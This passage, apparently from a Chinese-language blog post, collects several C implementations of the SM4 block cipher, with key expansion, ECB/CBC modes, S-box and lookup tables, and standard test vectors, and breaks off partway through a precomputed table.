K[(i+3)%4] ^ CK[i], 2);\t\tRK[i] = K[(i+4)%4];\t} }/*\t密钥扩展算法 \t参数：\tMK[4]：密钥     K[4]：中间数据    RK[32]：轮密钥，保存结果 \t返回值：无 */ void getRK(u32 MK[], u32 K[], u32 RK[]) {\textendFirst(MK, K);\textendSecond(RK, K);}/*\t迭代32次\t参数：\tu32 X[4]：迭代对象，保存结果    u32 RK[32]：轮密钥\t返回值：无\t  */void iterate32(u32 X[], u32 RK[]) {\tshort i;\tfor(i = 0; i &lt; 32; i++) {\t\tX[(i+4)%4] = X[i%4] ^ functionT(X[(i+1)%4] ^ X[(i+2)%4] ^ X[(i+3)%4] ^ RK[i], 1);\t}}/*\t反转函数 \t参数；\tu32 X[4]：反转对象    u32 Y[4]：反转结果\t返回值：无 */void reverse(u32 X[], u32 Y[]) {\t short i;\t for(i = 0; i &lt; 4; i++){\t \tY[i] = X[4 - 1 - i];\t } } /*\t加密算法\t参数：\tu32 X[4]：明文    u32 RK[32]：轮密钥    u32 Y[4]：密文，保存结果 \t返回值：无 */void encryptSM4(u32 X[], u32 RK[], u32 Y[]) {\titerate32(X, RK);\treverse(X, Y);} /*\t解密算法\t参数： \tu32 X[4]：密文    u32 RK[32]：轮密钥    u32 Y[4]：明文，保存结果\t返回值：无 */void decryptSM4(u32 X[], u32 RK[], u32 Y[]) {\tshort i;\tu32 reverseRK[32];\tfor(i = 0; i &lt; 32; i++) {\t\treverseRK[i] = RK[32-1-i];\t}\titerate32(X, reverseRK);\treverse(X, Y);} /*\t测试数据：\t明文：\t01234567 89abcdef fedcba98 76543210\t密钥：\t01234567 89abcdef fedcba98 76543210\t密文：\t681edf34 d206965e 86b3e94f 536e4246 */int main(void) {\tu32 X[4]; // 明文 \tu32 MK[4]; // 密钥 \tu32 RK[32]; // 轮密钥  \tu32 K[4]; // 中间数据 \tu32 Y[4]; // 密文 \tshort i; // 临时变量 \tprintf(\"明文：\"); \tscanf(\"%8x%8x%8x%8x\", &amp;X[0], &amp;X[1], &amp;X[2], &amp;X[3]);\tprintf(\"密钥：\"); \tscanf(\"%8x%8x%8x%8x\", &amp;MK[0], &amp;MK[1], &amp;MK[2], &amp;MK[3]);\tprintf(\"**************生成轮密钥*****************\\n\"); \tgetRK(MK, K, RK);\tfor(i = 0; i &lt; 32; i++) {\t\tprintf(\"[%2d]：%08x    \", i, RK[i]);\t\tif(i%4 == 3)\tprintf(\"\\n\"); \t}\tprintf(\"************** 生成密文 *****************\\n\"); \tencryptSM4(X, RK, Y);\tprintf(\"%08x %08x %08x %08x\\n\", Y[0], Y[1], Y[2], Y[3]);\tprintf(\"************** 生成明文 *****************\\n\");  \tdecryptSM4(Y, RK, X);\tprintf(\"%08x %08x %08x %08x\\n\", X[0], X[1], X[2], X[3]);\treturn 0;\t} \n\n代码2/* * SM4 Encryption alogrithm (SMS4 algorithm) * GM/T 0002-2012 Chinese National Standard ref:http://www.oscca.gov.cn/ * thanks to Xyssl * thnaks and refers to http://hi.baidu.com/numax/blog/item/80addfefddfb93e4cf1b3e61.html * author:goldboar * email:goldboar@163.com * 2012-4-20 */#define SM4_ENCRYPT 1#define SM4_DECRYPT 0typedef unsigned char uint8;typedef unsigned int uint32;/** * \\brief          SM4 context structure */typedef struct{    int mode;      /*!&lt;  encrypt/decrypt   */    uint32 sk[32]; /*!&lt;  SM4 subkeys       */} sm4_context;/** * \\brief          SM4 key schedule (128-bit, encryption) * * \\param ctx      SM4 context to be initialized * \\param key      16-byte secret key */void sm4_setkey_enc(sm4_context *ctx, uint8 key[16]);/** * \\brief          SM4 key schedule (128-bit, decryption) * * \\param ctx      SM4 context to be initialized * \\param key      16-byte secret key */void sm4_setkey_dec(sm4_context *ctx, uint8 key[16]);/** * \\brief          SM4-ECB block encryption/decryption * \\param ctx      SM4 context * \\param mode     SM4_ENCRYPT or SM4_DECRYPT * \\param length   length of the input data * \\param input    input block * \\param output   output block */void sm4_crypt_ecb(sm4_context *ctx,                   int mode,                   int length,                   uint8 *input,                   uint8 *output);/** * \\brief          SM4-CBC buffer encryption/decryption * \\param ctx      SM4 context * \\param mode     SM4_ENCRYPT or SM4_DECRYPT * \\param length   length of the input data * \\param iv       initialization vector (updated after use) * \\param input    buffer holding the input data * \\param output   buffer holding the output data */void sm4_crypt_cbc(sm4_context *ctx,                   int mode,                   int length,                   uint8 iv[16],                   uint8 *input,                   uint8 *output);#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;ctype.h&gt;/* * 32-bit integer manipulation macros (big endian) */#ifndef GET_UINT32_BE#define GET_UINT32_BE(n, b, i)                                                                                                 \\    {                                                                                                                         \\        (n) = ((uint32)(b)[(i)] &lt;&lt; 24) | ((uint32)(b)[(i) + 1] &lt;&lt; 16) | ((uint32)(b)[(i) + 2] &lt;&lt; 8) | ((uint32)(b)[(i) + 3]); \\    }#endif#ifndef PUT_UINT32_BE#define PUT_UINT32_BE(n, b, i)              \\    {                                      \\        (b)[(i)] = (uint8)((n) &gt;&gt; 24);     \\        (b)[(i) + 1] = (uint8)((n) &gt;&gt; 16); \\        (b)[(i) + 2] = (uint8)((n) &gt;&gt; 8);  \\        (b)[(i) + 3] = (uint8)((n));       \\    }#endif/* *rotate shift left marco definition * */#define SHL(x, n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)#define ROTL(x, n) (SHL((x), n) | ((x) &gt;&gt; (32 - n)))#define SWAP(a, b)    \\    {                 \\        uint32 t = a; \\        a = b;        \\        b = t;        \\        t = 0;        \\    }/* * Expanded SM4 S-boxes /* Sbox table: 8bits input convert to 8 bits output*/static const uint8 SboxTable[16][16] = {        {0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05},        {0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},        {0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62},        {0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6},        {0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8},        {0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35},        {0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87},        {0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e},        {0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1},        {0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3},        {0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f},        {0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51},        {0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8},        {0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0},        {0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84},        {0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}};/* System parameter */static const uint32 FK[4] = {0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc};/* fixed parameter */static const uint32 CK[32] = {        0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,        0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,        0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,        0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,        0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,        0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,        0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,        0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279};/* * private function: * look up in SboxTable and get the related value. * args:    [in] inch: 0x00~0xFF (8 bits unsigned value). */static uint8 sm4Sbox(uint8 inch){    uint8 *pTable = (uint8 *)SboxTable;    uint8 retVal = (uint8)(pTable[inch]);    return retVal;}void printHex_withSpace(char *name, void *ptr, int len);void hexdump(char *name, const void *data, size_t size);/* * private F(Lt) function: * \"T algorithm\" == \"L algorithm\" + \"t algorithm\". * args:    [in] a: a is a 32 bits unsigned value; * return: c: c is calculated with line algorithm \"L\" and nonline algorithm \"t\" */static uint32 sm4Lt(uint32 ka){    uint32 bb = 0;    uint32 c = 0;    uint8 a[4];    uint8 b[4];    PUT_UINT32_BE(ka, a, 0)    b[0] = sm4Sbox(a[0]);    b[1] = sm4Sbox(a[1]);    b[2] = sm4Sbox(a[2]);    b[3] = sm4Sbox(a[3]);    GET_UINT32_BE(bb, b, 0)    c = bb ^ (ROTL(bb, 2)) ^ (ROTL(bb, 10)) ^ (ROTL(bb, 18)) ^ (ROTL(bb, 24));    return c;}/* * private F function: * Calculating and getting encryption/decryption contents. * args:    [in] x0: original contents; * args:    [in] x1: original contents; * args:    [in] x2: original contents; * args:    [in] x3: original contents; * args:    [in] rk: encryption/decryption key; * return the contents of encryption/decryption contents. */static uint32 sm4F(uint32 x0, uint32 x1, uint32 x2, uint32 x3, uint32 rk){    return (x0 ^ sm4Lt(x1 ^ x2 ^ x3 ^ rk));}/* private function: * Calculating round encryption key. * args:    [in] a: a is a 32 bits unsigned value; * return: sk[i]: i{0,1,2,3,...31}. */static uint32 sm4CalciRK(uint32 ka){    uint32 bb = 0;    uint32 rk = 0;    uint8 a[4];    uint8 b[4];    PUT_UINT32_BE(ka, a, 0)    b[0] = sm4Sbox(a[0]);    b[1] = sm4Sbox(a[1]);    b[2] = sm4Sbox(a[2]);    b[3] = sm4Sbox(a[3]);    GET_UINT32_BE(bb, b, 0)    rk = bb ^ (ROTL(bb, 13)) ^ (ROTL(bb, 23));    return rk;}static void sm4_setkey(uint32 SK[32], uint8 key[16]){    uint32 MK[4];    uint32 k[36];    uint32 i = 0;    GET_UINT32_BE(MK[0], key, 0);    GET_UINT32_BE(MK[1], key, 4);    GET_UINT32_BE(MK[2], key, 8);    GET_UINT32_BE(MK[3], key, 12);    k[0] = MK[0] ^ FK[0];    k[1] = MK[1] ^ FK[1];    k[2] = MK[2] ^ FK[2];    k[3] = MK[3] ^ FK[3];        for (; i &lt; 32; i++)    {        k[i + 4] = k[i] ^ (sm4CalciRK(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ CK[i]));        SK[i] = k[i + 4];    }}/* * SM4 standard one round processing * */static void sm4_one_round(uint32 sk[32],                          uint8 input[16],                          uint8 output[16]){    uint32 i = 0;    uint32 ulbuf[36];    memset(ulbuf, 0, sizeof(ulbuf));    GET_UINT32_BE(ulbuf[0], input, 0)    GET_UINT32_BE(ulbuf[1], input, 4)    GET_UINT32_BE(ulbuf[2], input, 8)    GET_UINT32_BE(ulbuf[3], input, 12)    while (i &lt; 32)    {        ulbuf[i + 4] = sm4F(ulbuf[i], ulbuf[i + 1], ulbuf[i + 2], ulbuf[i + 3], sk[i]);        i++;    }        PUT_UINT32_BE(ulbuf[35], output, 0);    PUT_UINT32_BE(ulbuf[34], output, 4);    PUT_UINT32_BE(ulbuf[33], output, 8);    PUT_UINT32_BE(ulbuf[32], output, 12);}/* * SM4 key schedule (128-bit, encryption) */void sm4_setkey_enc(sm4_context *ctx, uint8 key[16]){    ctx-&gt;mode = SM4_ENCRYPT;    sm4_setkey(ctx-&gt;sk, key);}/* * SM4 key schedule (128-bit, decryption) */void sm4_setkey_dec(sm4_context *ctx, uint8 key[16]){    int i;    ctx-&gt;mode = SM4_ENCRYPT;    sm4_setkey(ctx-&gt;sk, key);    for (i = 0; i &lt; 16; i++)    {        SWAP(ctx-&gt;sk[i], ctx-&gt;sk[31 - i]);    }}/* * SM4-ECB block encryption/decryption */void sm4_crypt_ecb(sm4_context *ctx,                   int mode,                   int length,                   uint8 *input,                   uint8 *output){    while (length &gt; 0)    {        sm4_one_round(ctx-&gt;sk, input, output);        input += 16;        output += 16;        length -= 16;    }}/* * SM4-CBC buffer encryption/decryption */void sm4_crypt_cbc(sm4_context *ctx,                   int mode,                   int length,                   uint8 iv[16],                   uint8 *input,                   uint8 *output){    int i;    uint8 temp[16];    if (mode == SM4_ENCRYPT)    {        while (length &gt; 0)        {            for (i = 0; i &lt; 16; i++)                output[i] = (uint8)(input[i] ^ iv[i]);            sm4_one_round(ctx-&gt;sk, output, output);            memcpy(iv, output, 16);            input += 16;            output += 16;            length -= 16;        }    }    else /* SM4_DECRYPT */    {        while (length &gt; 0)        {            memcpy(temp, input, 16);            sm4_one_round(ctx-&gt;sk, input, output);            for (i = 0; i &lt; 16; i++)                output[i] = (uint8)(output[i] ^ iv[i]);            memcpy(iv, temp, 16);            input += 16;            output += 16;            length -= 16;        }    }}void printHex(char *name, void *ptr, int len){    printf(\"%s\", name);    for (size_t i = 0; i &lt; len; i++)        printf(\"%02x\", ((uint8 *)ptr)[i]);    printf(\"\\n\");}void printHex_withSpace(char *name, void *ptr, int len){    printf(\"%s\\n\", name);    for (size_t i = 0; i &lt; len * 4; i++)        printf(\"%02x \", ((uint8 *)ptr)[i]);    printf(\"\\n\");}void hexdump(char *name, const void *data, size_t size) {    const unsigned char *byte_data = (const unsigned char *)data;    size_t i, j;    printf(\"%s\\n\", name);    for (i = 0; i &lt; size; i += 16) {        // 打印偏移地址        printf(\"%08zx  \", i);        // 打印十六进制数据        for (j = 0; j &lt; 16; ++j) {            if (i + j &lt; size) {                printf(\"%02x \", byte_data[i + j]);            } else {                printf(\"   \"); // 不足部分用空格填充            }            // 在每8字节后添加一个额外的空格            if (j == 7) {                printf(\" \");            }        }        printf(\" |\");        // 打印ASCII字符        for (j = 0; j &lt; 16; ++j) {            if (i + j &lt; size) {                unsigned char ch = byte_data[i + j];                printf(\"%c\", isprint(ch) ? ch : '.');            } else {                printf(\" \");            }        }        printf(\"|\\n\");    }}int main(){    uint8 key[16] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10};    uint8 input[16] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10};    uint8 output[16];    sm4_context ctx;    uint32 i;    printHex(\"Key: \", key, 16);    // encrypt standard testing vector    sm4_setkey_enc(&amp;ctx, key);    hexdump(\"RK_enc: \", ctx.sk, 32 * 4);    sm4_crypt_ecb(&amp;ctx, 1, 16, input, output);    printHex(\"Crypted: \", output, 16);    // decrypt testing    sm4_setkey_dec(&amp;ctx, key);    hexdump(\"RK_dec: \", ctx.sk, 32 * 4);    sm4_crypt_ecb(&amp;ctx, 0, 16, output, output);    printHex(\"Original: \", output, 16);    return 0;}\n\n一份利用 SBOX_TX 加速运算的 SM4 代码#include \"stdlib.h\"#include \"ctype.h\"#include \"stdio.h\"typedef unsigned char uint8_t;typedef unsigned int uint32_t;#define SM4_ENCRYPT 1#define SM4_DECRYPT 0#define SM4_BLOCK_SIZE 16#define SM4_KEY_SCHEDULE 32typedef struct SM4_KEY_st{    uint32_t rk[SM4_KEY_SCHEDULE];} SM4_KEY;static const uint8_t SM4_S[256] = {    0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2,    0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3,    0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4,    0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,    0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA,    0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA,    0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2,    0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,    0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B,    0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52,    0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2,    0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1,    0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30,    0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60,    0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45,    0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51,    0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41,    0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD,    0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A,    0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84,    0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E,    0xD7, 0xCB, 0x39, 0x48};/* * SM4_SBOX_T[j] == L(SM4_SBOX[j]). */static const uint32_t SM4_SBOX_T0[256] = {    0x8ED55B5B, 0xD0924242, 0x4DEAA7A7, 0x06FDFBFB, 0xFCCF3333, 0x65E28787,    0xC93DF4F4, 0x6BB5DEDE, 0x4E165858, 0x6EB4DADA, 0x44145050, 0xCAC10B0B,    0x8828A0A0, 0x17F8EFEF, 0x9C2CB0B0, 0x11051414, 0x872BACAC, 0xFB669D9D,    0xF2986A6A, 0xAE77D9D9, 0x822AA8A8, 0x46BCFAFA, 0x14041010, 0xCFC00F0F,    0x02A8AAAA, 0x54451111, 0x5F134C4C, 0xBE269898, 0x6D482525, 0x9E841A1A,    0x1E061818, 0xFD9B6666, 0xEC9E7272, 0x4A430909, 0x10514141, 0x24F7D3D3,    0xD5934646, 0x53ECBFBF, 0xF89A6262, 0x927BE9E9, 0xFF33CCCC, 0x04555151,    0x270B2C2C, 0x4F420D0D, 0x59EEB7B7, 0xF3CC3F3F, 0x1CAEB2B2, 0xEA638989,    0x74E79393, 0x7FB1CECE, 0x6C1C7070, 0x0DABA6A6, 0xEDCA2727, 0x28082020,    0x48EBA3A3, 0xC1975656, 0x80820202, 0xA3DC7F7F, 0xC4965252, 0x12F9EBEB,    0xA174D5D5, 0xB38D3E3E, 0xC33FFCFC, 0x3EA49A9A, 0x5B461D1D, 0x1B071C1C,    0x3BA59E9E, 0x0CFFF3F3, 0x3FF0CFCF, 0xBF72CDCD, 0x4B175C5C, 0x52B8EAEA,    0x8F810E0E, 0x3D586565, 0xCC3CF0F0, 0x7D196464, 0x7EE59B9B, 0x91871616,    0x734E3D3D, 0x08AAA2A2, 0xC869A1A1, 0xC76AADAD, 0x85830606, 0x7AB0CACA,    0xB570C5C5, 0xF4659191, 0xB2D96B6B, 0xA7892E2E, 0x18FBE3E3, 0x47E8AFAF,    0x330F3C3C, 0x674A2D2D, 0xB071C1C1, 0x0E575959, 0xE99F7676, 0xE135D4D4,    0x661E7878, 0xB4249090, 0x360E3838, 0x265F7979, 0xEF628D8D, 0x38596161,    0x95D24747, 0x2AA08A8A, 0xB1259494, 0xAA228888, 0x8C7DF1F1, 0xD73BECEC,    0x05010404, 0xA5218484, 0x9879E1E1, 0x9B851E1E, 0x84D75353, 0x00000000,    0x5E471919, 0x0B565D5D, 0xE39D7E7E, 0x9FD04F4F, 0xBB279C9C, 0x1A534949,    0x7C4D3131, 0xEE36D8D8, 0x0A020808, 0x7BE49F9F, 0x20A28282, 0xD4C71313,    0xE8CB2323, 0xE69C7A7A, 0x42E9ABAB, 0x43BDFEFE, 0xA2882A2A, 0x9AD14B4B,    0x40410101, 0xDBC41F1F, 0xD838E0E0, 0x61B7D6D6, 0x2FA18E8E, 0x2BF4DFDF,    0x3AF1CBCB, 0xF6CD3B3B, 0x1DFAE7E7, 0xE5608585, 0x41155454, 0x25A38686,    0x60E38383, 0x16ACBABA, 0x295C7575, 0x34A69292, 0xF7996E6E, 0xE434D0D0,    0x721A6868, 0x01545555, 0x19AFB6B6, 0xDF914E4E, 0xFA32C8C8, 0xF030C0C0,    0x21F6D7D7, 0xBC8E3232, 0x75B3C6C6, 0x6FE08F8F, 0x691D7474, 0x2EF5DBDB,    0x6AE18B8B, 0x962EB8B8, 0x8A800A0A, 0xFE679999, 0xE2C92B2B, 0xE0618181,    0xC0C30303, 0x8D29A4A4, 0xAF238C8C, 0x07A9AEAE, 0x390D3434, 0x1F524D4D,    0x764F3939, 0xD36EBDBD, 0x81D65757, 0xB7D86F6F, 0xEB37DCDC, 0x51441515,    0xA6DD7B7B, 0x09FEF7F7, 0xB68C3A3A, 0x932FBCBC, 0x0F030C0C, 0x03FCFFFF,    0xC26BA9A9, 0xBA73C9C9, 0xD96CB5B5, 0xDC6DB1B1, 0x375A6D6D, 0x15504545,    0xB98F3636, 0x771B6C6C, 0x13ADBEBE, 0xDA904A4A, 0x57B9EEEE, 0xA9DE7777,    0x4CBEF2F2, 0x837EFDFD, 0x55114444, 0xBDDA6767, 0x2C5D7171, 0x45400505,    0x631F7C7C, 0x50104040, 0x325B6969, 0xB8DB6363, 0x220A2828, 0xC5C20707,    0xF531C4C4, 0xA88A2222, 0x31A79696, 0xF9CE3737, 0x977AEDED, 0x49BFF6F6,    0x992DB4B4, 0xA475D1D1, 0x90D34343, 0x5A124848, 0x58BAE2E2, 0x71E69797,    0x64B6D2D2, 0x70B2C2C2, 0xAD8B2626, 0xCD68A5A5, 0xCB955E5E, 0x624B2929,    0x3C0C3030, 0xCE945A5A, 0xAB76DDDD, 0x867FF9F9, 0xF1649595, 0x5DBBE6E6,    0x35F2C7C7, 0x2D092424, 0xD1C61717, 0xD66FB9B9, 0xDEC51B1B, 0x94861212,    0x78186060, 0x30F3C3C3, 0x897CF5F5, 0x5CEFB3B3, 0xD23AE8E8, 0xACDF7373,    0x794C3535, 0xA0208080, 0x9D78E5E5, 0x56EDBBBB, 0x235E7D7D, 0xC63EF8F8,    0x8BD45F5F, 0xE7C82F2F, 0xDD39E4E4, 0x68492121};static uint32_t SM4_SBOX_T1[256] = {    0x5B8ED55B, 0x42D09242, 0xA74DEAA7, 0xFB06FDFB, 0x33FCCF33, 0x8765E287,    0xF4C93DF4, 0xDE6BB5DE, 0x584E1658, 0xDA6EB4DA, 0x50441450, 0x0BCAC10B,    0xA08828A0, 0xEF17F8EF, 0xB09C2CB0, 0x14110514, 0xAC872BAC, 0x9DFB669D,    0x6AF2986A, 0xD9AE77D9, 0xA8822AA8, 0xFA46BCFA, 0x10140410, 0x0FCFC00F,    0xAA02A8AA, 0x11544511, 0x4C5F134C, 0x98BE2698, 0x256D4825, 0x1A9E841A,    0x181E0618, 0x66FD9B66, 0x72EC9E72, 0x094A4309, 0x41105141, 0xD324F7D3,    0x46D59346, 0xBF53ECBF, 0x62F89A62, 0xE9927BE9, 0xCCFF33CC, 0x51045551,    0x2C270B2C, 0x0D4F420D, 0xB759EEB7, 0x3FF3CC3F, 0xB21CAEB2, 0x89EA6389,    0x9374E793, 0xCE7FB1CE, 0x706C1C70, 0xA60DABA6, 0x27EDCA27, 0x20280820,    0xA348EBA3, 0x56C19756, 0x02808202, 0x7FA3DC7F, 0x52C49652, 0xEB12F9EB,    0xD5A174D5, 0x3EB38D3E, 0xFCC33FFC, 0x9A3EA49A, 0x1D5B461D, 0x1C1B071C,    0x9E3BA59E, 0xF30CFFF3, 0xCF3FF0CF, 0xCDBF72CD, 0x5C4B175C, 0xEA52B8EA,    0x0E8F810E, 0x653D5865, 0xF0CC3CF0, 0x647D1964, 0x9B7EE59B, 0x16918716,    0x3D734E3D, 0xA208AAA2, 0xA1C869A1, 0xADC76AAD, 0x06858306, 0xCA7AB0CA,    0xC5B570C5, 0x91F46591, 0x6BB2D96B, 0x2EA7892E, 0xE318FBE3, 0xAF47E8AF,    0x3C330F3C, 0x2D674A2D, 0xC1B071C1, 0x590E5759, 0x76E99F76, 0xD4E135D4,    0x78661E78, 0x90B42490, 0x38360E38, 0x79265F79, 0x8DEF628D, 0x61385961,    0x4795D247, 0x8A2AA08A, 0x94B12594, 0x88AA2288, 0xF18C7DF1, 0xECD73BEC,    0x04050104, 0x84A52184, 0xE19879E1, 0x1E9B851E, 0x5384D753, 0x00000000,    0x195E4719, 0x5D0B565D, 0x7EE39D7E, 0x4F9FD04F, 0x9CBB279C, 0x491A5349,    0x317C4D31, 0xD8EE36D8, 0x080A0208, 0x9F7BE49F, 0x8220A282, 0x13D4C713,    0x23E8CB23, 0x7AE69C7A, 0xAB42E9AB, 0xFE43BDFE, 0x2AA2882A, 0x4B9AD14B,    0x01404101, 0x1FDBC41F, 0xE0D838E0, 0xD661B7D6, 0x8E2FA18E, 0xDF2BF4DF,    0xCB3AF1CB, 0x3BF6CD3B, 0xE71DFAE7, 0x85E56085, 0x54411554, 0x8625A386,    0x8360E383, 0xBA16ACBA, 0x75295C75, 0x9234A692, 0x6EF7996E, 0xD0E434D0,    0x68721A68, 0x55015455, 0xB619AFB6, 0x4EDF914E, 0xC8FA32C8, 0xC0F030C0,    0xD721F6D7, 0x32BC8E32, 0xC675B3C6, 0x8F6FE08F, 0x74691D74, 0xDB2EF5DB,    0x8B6AE18B, 0xB8962EB8, 0x0A8A800A, 0x99FE6799, 0x2BE2C92B, 0x81E06181,    0x03C0C303, 0xA48D29A4, 0x8CAF238C, 0xAE07A9AE, 0x34390D34, 0x4D1F524D,    0x39764F39, 0xBDD36EBD, 0x5781D657, 0x6FB7D86F, 0xDCEB37DC, 0x15514415,    0x7BA6DD7B, 0xF709FEF7, 0x3AB68C3A, 0xBC932FBC, 0x0C0F030C, 0xFF03FCFF,    0xA9C26BA9, 0xC9BA73C9, 0xB5D96CB5, 0xB1DC6DB1, 0x6D375A6D, 0x45155045,    0x36B98F36, 0x6C771B6C, 0xBE13ADBE, 0x4ADA904A, 0xEE57B9EE, 0x77A9DE77,    0xF24CBEF2, 0xFD837EFD, 0x44551144, 0x67BDDA67, 0x712C5D71, 0x05454005,    0x7C631F7C, 0x40501040, 0x69325B69, 0x63B8DB63, 0x28220A28, 0x07C5C207,    0xC4F531C4, 0x22A88A22, 0x9631A796, 0x37F9CE37, 0xED977AED, 0xF649BFF6,    0xB4992DB4, 0xD1A475D1, 0x4390D343, 0x485A1248, 0xE258BAE2, 0x9771E697,    0xD264B6D2, 0xC270B2C2, 0x26AD8B26, 0xA5CD68A5, 0x5ECB955E, 0x29624B29,    0x303C0C30, 0x5ACE945A, 0xDDAB76DD, 0xF9867FF9, 0x95F16495, 0xE65DBBE6,    0xC735F2C7, 0x242D0924, 0x17D1C617, 0xB9D66FB9, 0x1BDEC51B, 0x12948612,    0x60781860, 0xC330F3C3, 0xF5897CF5, 0xB35CEFB3, 0xE8D23AE8, 0x73ACDF73,    0x35794C35, 0x80A02080, 0xE59D78E5, 0xBB56EDBB, 0x7D235E7D, 0xF8C63EF8,    0x5F8BD45F, 0x2FE7C82F, 0xE4DD39E4, 0x21684921};static uint32_t SM4_SBOX_T2[256] = {    0x5B5B8ED5, 0x4242D092, 0xA7A74DEA, 0xFBFB06FD, 0x3333FCCF, 0x878765E2,    0xF4F4C93D, 0xDEDE6BB5, 0x58584E16, 